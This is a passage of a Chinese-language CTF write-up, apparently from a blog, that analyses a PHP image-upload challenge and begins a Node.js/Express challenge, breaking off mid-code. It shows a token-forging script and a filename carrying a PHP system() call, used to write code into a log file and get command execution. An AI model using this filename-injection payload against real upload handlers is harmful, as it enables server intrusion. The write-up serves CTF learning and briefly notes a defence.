+</span></span><span class="line"><span class="cl">        <span class="nv">$p</span> <span class="o">=</span> <span class="nv">$count</span> <span class="o">/</span> <span class="nv">$len</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$h</span> <span class="o">-=</span> <span class="nv">$p</span> <span class="o">*</span> <span class="nx">log</span><span class="p">(</span><span class="nv">$p</span><span class="p">,</span> <span class="mi">2</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nv">$h</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">$file</span> <span class="o">=</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">]</span> <span class="o">??</span> <span class="k">null</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$user_token</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;token&#39;</span><span class="p">]</span> <span class="o">??</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$user_ts</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;ts&#39;</span><span class="p">]</span> <span class="o">??</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$file</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">die</span><span class="p">(</span><span class="s2">&#34;没有文件上传&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">$filename</span> <span class="o">=</span> <span class="nx">basename</span><span class="p">(</span><span class="nv">$file</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$filesize</span> <span class="o">=</span> <span class="nv">$file</span><span class="p">[</span><span class="s1">&#39;size&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$tmp</span> <span class="o">=</span> <span class="nv">$file</span><span class="p">[</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$secret</span> <span class="o">=</span> <span class="s2">&#34;secret_key&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$allowed_ext</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&#34;jpg&#34;</span><span class="p">,</span> <span class="s2">&#34;jpeg&#34;</span><span class="p">,</span> <span class="s2">&#34;png&#34;</span><span class="p">,</span> <span class="s2">&#34;gif&#34;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$max_size</span> <span class="o">=</span> <span class="mi">5</span> <span class="o">*</span> <span class="mi">1024</span> <span class="o">*</span> <span class="mi">1024</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nv">$filesize</span> <span class="o">&gt;</span> <span class="nv">$max_size</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">die</span><span class="p">(</span><span class="s2">&#34;文件太大&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">checkFileNameLength</span><span class="p">(</span><span class="nv">$filename</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    <span class="k">die</span><span class="p">(</span><span class="s2">&#34;文件名过长&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">$ext</span> <span class="o">=</span> <span class="nx">strtolower</span><span class="p">(</span><span class="nx">pathinfo</span><span class="p">(</span><span class="nv">$filename</span><span class="p">,</span> <span class="nx">PATHINFO_EXTENSION</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">checkFileExtension</span><span class="p">(</span><span class="nv">$ext</span><span class="p">,</span> <span class="nv">$allowed_ext</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    <span class="k">die</span><span class="p">(</span><span class="s2">&#34;不支持的文件类型&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nx">isBlacklisted</span><span class="p">(</span><span class="nv">$filename</span><span class="p">,</span> <span class="p">[</span><span class="s2">&#34;php&#34;</span><span class="p">,</span> <span class="s2">&#34;phtml&#34;</span><span class="p">,</span> <span class="s2">&#34;phar&#34;</span><span class="p">,</span> <span class="s2">&#34;asp&#34;</span><span class="p">,</span> <span class="s2">&#34;jsp&#34;</span><span class="p">]))</span>
+</span></span><span class="line"><span class="cl">    <span class="k">die</span><span class="p">(</span><span class="s2">&#34;文件名不合法&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">verifyToken</span><span class="p">(</span><span class="nv">$filename</span><span class="p">,</span> <span class="nv">$filesize</span><span class="p">,</span> <span class="nv">$user_ts</span><span class="p">,</span> <span class="nv">$user_token</span><span class="p">,</span> <span class="nv">$secret</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    <span class="k">die</span><span class="p">(</span><span class="s2">&#34;token error&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">isValidImage</span><span class="p">(</span><span class="nv">$tmp</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    <span class="k">die</span><span class="p">(</span><span class="s2">&#34;文件内容不是合法图片&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">fakeVirusScan</span><span class="p">(</span><span class="nv">$tmp</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    <span class="k">die</span><span class="p">(</span><span class="s2">&#34;检测到潜在风险&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">$mime</span> <span class="o">=</span> <span class="nx">detectMime</span><span class="p">(</span><span class="nv">$tmp</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$savePath</span> <span class="o">=</span> <span class="nx">saveFile</span><span class="p">(</span><span class="nv">$tmp</span><span class="p">,</span> <span class="no">__DIR__</span> <span class="o">.</span> <span class="s2">&#34;/uploads/&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">writeLog</span><span class="p">(</span><span class="nv">$filename</span><span class="p">,</span> <span class="nv">$filesize</span><span class="p">,</span> <span class="nv">$mime</span><span class="p">,</span> <span class="nv">$savePath</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nx">updateStats</span><span class="p">(</span><span class="nv">$filesize</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nx">simulateProgress</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="nx">generateThumbnail</span><span class="p">(</span><span class="nv">$tmp</span><span class="p">,</span> <span class="nv">$ext</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nx">checkUserRole</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="nx">calculateEntropy</span><span class="p">(</span><span class="nv">$tmp</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="s2">&#34;上传成功！&#34;</span><span class="p">;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>发现，我们可以控制filename写恶意命令进upload.log，也就是文件名写马</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">writeLog</span><span class="p">(</span><span class="nv">$filename</span><span class="p">,</span> <span class="nv">$filesize</span><span class="p">,</span> <span class="nv">$mime</span><span class="p">,</span> <span class="nv">$savePath</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$logline</span> <span class="o">=</span> <span class="nx">sprintf</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;[%s] 上传文件: %s (%d bytes) MIME=%s 保存路径=%s</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">date</span><span class="p">(</span><span class="s2">&#34;Y-m-d H:i:s&#34;</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$filename</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$filesize</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$mime</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$savePath</span>
+</span></span><span class="line"><span class="cl">    <span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">file_put_contents</span><span class="p">(</span><span class="no">__DIR__</span> <span class="o">.</span> <span class="s2">&#34;/upload.log&#34;</span><span class="p">,</span> <span class="nv">$logline</span><span class="p">,</span> <span class="nx">FILE_APPEND</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这两行注意一下</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">verifyToken</span><span class="p">(</span><span class="nv">$filename</span><span class="p">,</span> <span class="nv">$filesize</span><span class="p">,</span> <span class="nv">$user_ts</span><span class="p">,</span> <span class="nv">$user_token</span><span class="p">,</span> <span class="nv">$secret</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    <span class="k">die</span><span class="p">(</span><span class="s2">&#34;token error&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">isValidImage</span><span class="p">(</span><span class="nv">$tmp</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    <span class="k">die</span><span class="p">(</span><span class="s2">&#34;文件内容不是合法图片&#34;</span><span class="p">);</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>token检测写个代码过（除了filesize可控参数，filesize我们可以看上传文件的属性得到）</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$filename</span> <span class="o">=</span> <span class="s2">&#34;&lt;?=system(&#39;dir&#39;);?&gt;.jpg&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$filesize</span> <span class="o">=</span> <span class="mi">670</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$ts</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$secret</span> <span class="o">=</span> <span class="s2">&#34;secret_key&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$realToken</span> <span class="o">=</span> <span class="nx">sha1</span><span class="p">(</span><span class="nv">$filename</span> <span class="o">.</span> <span class="nv">$filesize</span> <span class="o">.</span> <span class="nv">$ts</span> <span class="o">.</span> <span class="nv">$secret</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nv">$realToken</span><span class="p">;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><code>isValidImage</code>怎么过？看代码，要上传一个真实的图片</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">detectMime</span><span class="p">(</span><span class="nv">$tmp</span><span class="p">)</span><span class="c1">//检查MIME类型
+</span></span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$finfo</span> <span class="o">=</span> <span class="nx">finfo_open</span><span class="p">(</span><span class="nx">FILEINFO_MIME_TYPE</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$mime</span> <span class="o">=</span> <span class="nx">finfo_file</span><span class="p">(</span><span class="nv">$finfo</span><span class="p">,</span> <span class="nv">$tmp</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">finfo_close</span><span class="p">(</span><span class="nv">$finfo</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nv">$mime</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">isValidImage</span><span class="p">(</span><span class="nv">$tmp</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!@</span><span class="nx">getimagesize</span><span class="p">(</span><span class="nv">$tmp</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">strpos</span><span class="p">(</span><span class="nx">detectMime</span><span class="p">(</span><span class="nv">$tmp</span><span class="p">),</span> <span class="s2">&#34;image/&#34;</span><span class="p">)</span> <span class="o">===</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>最后得到</p>
+<img src="image-20251215221439096.png" alt="image-20251215221439096" style="zoom:50%;" />
+<img src="image-20251215221459358.png" alt="image-20251215221459358" style="zoom:50%;" />
+<p>解决，防御的话文件名过滤&lt;与?差不多。</p>
+<p>点评：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">这题当傻子了，因为代码没给login.php我说咋登入不了，进入不到login.php,是直接将session移除了，自己写个上传文件的表单，后面发现users.php有上传文件的点，不过值得肯定是，这题的代码漏洞过程基本手动挖掘，卡在getimagesize()了一会，其是检测文件是否是图片，得上传真实图片
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="node">node
+</h2><p>这个js代码2个逻辑漏洞</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">  1
+</span><span class="lnt">  2
+</span><span class="lnt">  3
+</span><span class="lnt">  4
+</span><span class="lnt">  5
+</span><span class="lnt">  6
+</span><span class="lnt">  7
+</span><span class="lnt">  8
+</span><span class="lnt">  9
+</span><span class="lnt"> 10
+</span><span class="lnt"> 11
+</span><span class="lnt"> 12
+</span><span class="lnt"> 13
+</span><span class="lnt"> 14
+</span><span class="lnt"> 15
+</span><span class="lnt"> 16
+</span><span class="lnt"> 17
+</span><span class="lnt"> 18
+</span><span class="lnt"> 19
+</span><span class="lnt"> 20
+</span><span class="lnt"> 21
+</span><span class="lnt"> 22
+</span><span class="lnt"> 23
+</span><span class="lnt"> 24
+</span><span class="lnt"> 25
+</span><span class="lnt"> 26
+</span><span class="lnt"> 27
+</span><span class="lnt"> 28
+</span><span class="lnt"> 29
+</span><span class="lnt"> 30
+</span><span class="lnt"> 31
+</span><span class="lnt"> 32
+</span><span class="lnt"> 33
+</span><span class="lnt"> 34
+</span><span class="lnt"> 35
+</span><span class="lnt"> 36
+</span><span class="lnt"> 37
+</span><span class="lnt"> 38
+</span><span class="lnt"> 39
+</span><span class="lnt"> 40
+</span><span class="lnt"> 41
+</span><span class="lnt"> 42
+</span><span class="lnt"> 43
+</span><span class="lnt"> 44
+</span><span class="lnt"> 45
+</span><span class="lnt"> 46
+</span><span class="lnt"> 47
+</span><span class="lnt"> 48
+</span><span class="lnt"> 49
+</span><span class="lnt"> 50
+</span><span class="lnt"> 51
+</span><span class="lnt"> 52
+</span><span class="lnt"> 53
+</span><span class="lnt"> 54
+</span><span class="lnt"> 55
+</span><span class="lnt"> 56
+</span><span class="lnt"> 57
+</span><span class="lnt"> 58
+</span><span class="lnt"> 59
+</span><span class="lnt"> 60
+</span><span class="lnt"> 61
+</span><span class="lnt"> 62
+</span><span class="lnt"> 63
+</span><span class="lnt"> 64
+</span><span class="lnt"> 65
+</span><span class="lnt"> 66
+</span><span class="lnt"> 67
+</span><span class="lnt"> 68
+</span><span class="lnt"> 69
+</span><span class="lnt"> 70
+</span><span class="lnt"> 71
+</span><span class="lnt"> 72
+</span><span class="lnt"> 73
+</span><span class="lnt"> 74
+</span><span class="lnt"> 75
+</span><span class="lnt"> 76
+</span><span class="lnt"> 77
+</span><span class="lnt"> 78
+</span><span class="lnt"> 79
+</span><span class="lnt"> 80
+</span><span class="lnt"> 81
+</span><span class="lnt"> 82
+</span><span class="lnt"> 83
+</span><span class="lnt"> 84
+</span><span class="lnt"> 85
+</span><span class="lnt"> 86
+</span><span class="lnt"> 87
+</span><span class="lnt"> 88
+</span><span class="lnt"> 89
+</span><span class="lnt"> 90
+</span><span class="lnt"> 91
+</span><span class="lnt"> 92
+</span><span class="lnt"> 93
+</span><span class="lnt"> 94
+</span><span class="lnt"> 95
+</span><span class="lnt"> 96
+</span><span class="lnt"> 97
+</span><span class="lnt"> 98
+</span><span class="lnt"> 99
+</span><span class="lnt">100
+</span><span class="lnt">101
+</span><span class="lnt">102
+</span><span class="lnt">103
+</span><span class="lnt">104
+</span><span class="lnt">105
+</span><span class="lnt">106
+</span><span class="lnt">107
+</span><span class="lnt">108
+</span><span class="lnt">109
+</span><span class="lnt">110
+</span><span class="lnt">111
+</span><span class="lnt">112
+</span><span class="lnt">113
+</span><span class="lnt">114
+</span><span class="lnt">115
+</span><span class="lnt">116
+</span><span class="lnt">117
+</span><span class="lnt">118
+</span><span class="lnt">119
+</span><span class="lnt">120
+</span><span class="lnt">121
+</span><span class="lnt">122
+</span><span class="lnt">123
+</span><span class="lnt">124
+</span><span class="lnt">125
+</span><span class="lnt">126
+</span><span class="lnt">127
+</span><span class="lnt">128
+</span><span class="lnt">129
+</span><span class="lnt">130
+</span><span class="lnt">131
+</span><span class="lnt">132
+</span><span class="lnt">133
+</span><span class="lnt">134
+</span><span class="lnt">135
+</span><span class="lnt">136
+</span><span class="lnt">137
+</span><span class="lnt">138
+</span><span class="lnt">139
+</span><span class="lnt">140
+</span><span class="lnt">141
+</span><span class="lnt">142
+</span><span class="lnt">143
+</span><span class="lnt">144
+</span><span class="lnt">145
+</span><span class="lnt">146
+</span><span class="lnt">147
+</span><span class="lnt">148
+</span><span class="lnt">149
+</span><span class="lnt">150
+</span><span class="lnt">151
+</span><span class="lnt">152
+</span><span class="lnt">153
+</span><span class="lnt">154
+</span><span class="lnt">155
+</span><span class="lnt">156
+</span><span class="lnt">157
+</span><span class="lnt">158
+</span><span class="lnt">159
+</span><span class="lnt">160
+</span><span class="lnt">161
+</span><span class="lnt">162
+</span><span class="lnt">163
+</span><span class="lnt">164
+</span><span class="lnt">165
+</span><span class="lnt">166
+</span><span class="lnt">167
+</span><span class="lnt">168
+</span><span class="lnt">169
+</span><span class="lnt">170
+</span><span class="lnt">171
+</span><span class="lnt">172
+</span><span class="lnt">173
+</span><span class="lnt">174
+</span><span class="lnt">175
+</span><span class="lnt">176
+</span><span class="lnt">177
+</span><span class="lnt">178
+</span><span class="lnt">179
+</span><span class="lnt">180
+</span><span class="lnt">181
+</span><span class="lnt">182
+</span><span class="lnt">183
+</span><span class="lnt">184
+</span><span class="lnt">185
+</span><span class="lnt">186
+</span><span class="lnt">187
+</span><span class="lnt">188
+</span><span class="lnt">189
+</span><span class="lnt">190
+</span><span class="lnt">191
+</span><span class="lnt">192
+</span><span class="lnt">193
+</span><span class="lnt">194
+</span><span class="lnt">195
+</span><span class="lnt">196
+</span><span class="lnt">197
+</span><span class="lnt">198
+</span><span class="lnt">199
+</span><span class="lnt">200
+</span><span class="lnt">201
+</span><span class="lnt">202
+</span><span class="lnt">203
+</span><span class="lnt">204
+</span><span class="lnt">205
+</span><span class="lnt">206
+</span><span class="lnt">207
+</span><span class="lnt">208
+</span><span class="lnt">209
+</span><span class="lnt">210
+</span><span class="lnt">211
+</span><span class="lnt">212
+</span><span class="lnt">213
+</span><span class="lnt">214
+</span><span class="lnt">215
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">const</span> <span class="no">express</span> <span class="o">=</span> <span class="k">require</span><span class="p">(</span><span class="s1">&#39;express&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">const</span> <span class="no">cookieParser</span> <span class="o">=</span> <span class="k">require</span><span class="p">(</span><span class="s1">&#39;cookie-parser&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">const</span> <span class="no">multer</span> <span class="o">=</span> <span class="k">require</span><span class="p">(</span><span class="s1">&#39;multer&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">const</span> <span class="no">fs</span> <span class="o">=</span> <span class="k">require</span><span class="p">(</span><span class="s1">&#39;fs&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">const</span> <span class="no">path</span> <span class="o">=</span> <span class="k">require</span><span class="p">(</span><span class="s1">&#39;path&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">const</span> <span class="no">app</span> <span class="o">=</span> <span class="nx">express</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="k">const</span> <span class="no">PORT</span> <span class="o">=</span> <span class="nx">process</span><span class="o">.</span><span class="nx">env</span><span class="o">.</span><span class="nx">PORT</span> <span class="o">||</span> <span class="mi">3000</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">app</span><span class="o">.</span><span class="k">use</span><span class="p">(</span><span class="nx">express</span><span class="o">.</span><span class="nx">urlencoded</span><span class="p">({</span> <span class="nx">extended</span><span class="o">:</span> <span class="k">false</span> <span class="p">}));</span>
+</span></span><span class="line"><span class="cl"><span class="nx">app</span><span class="o">.</span><span class="k">use</span><span class="p">(</span><span class="nx">cookieParser</span><span class="p">(</span><span class="nx">process</span><span class="o">.</span><span class="nx">env</span><span class="o">.</span><span class="nx">COOKIE_SECRET</span> <span class="o">||</span> <span class="s1">&#39;ctf_secret_where&#39;</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">const</span> <span class="no">CACHE</span> <span class="o">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="nx">users</span><span class="o">:</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">};</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">app</span><span class="o">.</span><span class="nx">set</span><span class="p">(</span><span class="s1">&#39;view engine&#39;</span><span class="p">,</span> <span class="s1">&#39;ejs&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nx">app</span><span class="o">.</span><span class="k">use</span><span class="p">(</span><span class="nx">express</span><span class="o">.</span><span class="k">static</span><span class="p">(</span><span class="s1">&#39;public&#39;</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl"><span class="nx">app</span><span class="o">.</span><span class="k">use</span><span class="p">(</span><span class="nx">express</span><span class="o">.</span><span class="nx">urlencoded</span><span class="p">({</span> <span class="nx">extended</span><span class="o">:</span> <span class="k">true</span> <span class="p">}));</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">waf</span><span class="p">(</span><span class="nx">username</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="nx">String</span><span class="p">(</span><span class="nx">username</span> <span class="o">||</span> <span class="s1">&#39;&#39;</span><span class="p">)</span><span class="o">.</span><span class="nx">replace</span><span class="p">(</span><span class="o">/</span><span class="p">[</span><span class="nx">\</span><span class="p">{</span><span class="nx">\</span><span class="p">}</span><span class="o">%</span><span class="p">()</span><span class="nx">_</span><span class="p">]</span><span class="o">/</span><span class="nx">g</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">getUsername</span><span class="p">(</span><span class="nx">req</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="nx">req</span><span class="o">.</span><span class="nx">signedCookies</span> <span class="o">&amp;&amp;</span> <span class="nx">req</span><span class="o">.</span><span class="nx">signedCookies</span><span class="o">.</span><span class="nx">username</span> <span class="o">?</span> <span class="nx">req</span><span class="o">.</span><span class="nx">signedCookies</span><span class="o">.</span><span class="nx">username</span> <span class="o">:</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">isLogin</span><span class="p">(</span><span class="nx">req</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="nx">req</span><span class="o">.</span><span class="nx">signedCookies</span> <span class="o">&amp;&amp;</span> <span class="nx">req</span><span class="o">.</span><span class="nx">signedCookies</span><span class="o">.</span><span class="nx">logged</span> <span class="o">===</span> <span class="s1">&#39;1&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">const</span> <span class="no">storage</span> <span class="o">=</span> <span class="nx">multer</span><span class="o">.</span><span class="nx">diskStorage</span><span class="p">({</span>
+</span></span><span class="line"><span class="cl">  <span class="nx">destination</span><span class="o">:</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">file</span><span class="p">,</span> <span class="nx">cb</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">const</span> <span class="no">user</span> <span class="o">=</span> <span class="nx">getUsername</span><span class="p">(</span><span class="nx">req</span><span class="p">)</span> <span class="o">||</span> <span class="s1">&#39;anonymous&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">const</span> <span class="no">dir</span> <span class="o">=</span> <span class="nx">path</span><span class="o">.</span><span class="nx">join</span><span class="p">(</span><span class="nx">__dirname</span><span class="p">,</span> <span class="s1">&#39;media&#39;</span><span class="p">,</span> <span class="nx">user</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">fs</span><span class="o">.</span><span class="nx">existsSync</span><span class="p">(</span><span class="nx">dir</span><span class="p">))</span> <span class="nx">fs</span><span class="o">.</span><span class="nx">mkdirSync</span><span class="p">(</span><span class="nx">dir</span><span class="p">,</span> <span class="p">{</span> <span class="nx">recursive</span><span class="o">:</span> <span class="k">true</span> <span class="p">});</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">cb</span><span class="p">(</span><span class="k">null</span><span class="p">,</span> <span class="nx">dir</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="p">},</span>
